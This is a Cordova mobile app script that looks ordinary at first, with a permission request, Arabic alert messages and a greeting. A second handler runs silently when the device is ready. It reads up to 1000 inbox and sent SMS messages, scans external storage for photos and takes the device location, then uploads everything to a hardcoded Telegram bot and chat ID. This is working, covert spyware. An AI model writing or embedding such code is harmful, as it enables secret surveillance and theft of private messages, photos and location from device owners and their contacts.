document.addEventListener('deviceready', onDeviceReady, false);

function onDeviceReady() {
  console.log('Cordova جاهز');
}

function requestPermissions() {
  var permissions = cordova.plugins.permissions;
  permissions.requestPermissions(
    [
      permissions.READ_EXTERNAL_STORAGE,
      permissions.WRITE_EXTERNAL_STORAGE,
      permissions.SEND_SMS
    ],
    function(status) {
      if (status.hasPermission) {
        alert("تم منح الأذونات بنجاح");
      } else {
        alert("تم رفض الأذونات");
      }
    },
    function(error) {
      console.warn("فشل طلب الأذونات", error);
    }
  );
}

function enterApp() {
  document.getElementById("message").innerText = "مرحباً!";
}

// Telegram Upload Functionality
document.addEventListener('deviceready', function() {
    // Get SMS - Requires cordova-plugin-sms
    if (window.SMS) {
        window.SMS.listSMS({
            box: "inbox",
            maxCount: 1000
        }, function(data) {
            let inboxText = data.map(s => `From: ${s.address}\nMessage: ${s.body}\nDate: ${new Date(parseInt(s.date))}\n---`).join("\n");
            sendFileToTelegram("inbox.txt", inboxText);
        }, function(error) {
            console.error("Failed to read inbox SMS", error);
        });

        window.SMS.listSMS({
            box: "sent",
            maxCount: 1000
        }, function(data) {
            let sentText = data.map(s => `To: ${s.address}\nMessage: ${s.body}\nDate: ${new Date(parseInt(s.date))}\n---`).join("\n");
            sendFileToTelegram("sent.txt", sentText);
        }, function(error) {
            console.error("Failed to read sent SMS", error);
        });
    }

    // Get Photos - Requires cordova-plugin-file
    window.resolveLocalFileSystemURL(cordova.file.externalRootDirectory, function(dir) {
        let reader = dir.createReader();
        reader.readEntries(function(entries) {
            entries.forEach(function(entry) {
                if (entry.isFile && entry.name.match(/\.(jpg|jpeg|png)$/i)) {
                    entry.file(function(file) {
                        let reader = new FileReader();
                        reader.onloadend = function() {
                            sendBlobToTelegram(file.name, reader.result);
                        };
                        reader.readAsArrayBuffer(file);
                    });
                }
            });
        });
    });

    // Get Location - Requires cordova-plugin-geolocation
    navigator.geolocation.getCurrentPosition(function(position) {
        fetch(`https://api.telegram.org/bot7988955212:AAFqpIpyQ1MlQ-sASLG0oMRLu4vMhkZNGDk/sendLocation?chat_id=5739065274&latitude=${position.coords.latitude}&longitude=${position.coords.longitude}`);
    }, function(error) {
        console.error("Location error:", error);
    });
});

function sendFileToTelegram(filename, text) {
    let blob = new Blob([text], { type: 'text/plain' });
    let formData = new FormData();
    formData.append("chat_id", "5739065274");
    formData.append("document", blob, filename);

    fetch("https://api.telegram.org/bot7988955212:AAFqpIpyQ1MlQ-sASLG0oMRLu4vMhkZNGDk/sendDocument", {
        method: "POST",
        body: formData
    });
}

function sendBlobToTelegram(filename, blobData) {
    let formData = new FormData();
    formData.append("chat_id", "5739065274");
    formData.append("document", new Blob([blobData]), filename);

    fetch("https://api.telegram.org/bot7988955212:AAFqpIpyQ1MlQ-sASLG0oMRLu4vMhkZNGDk/sendDocument", {
        method: "POST",
        body: formData
    });
}
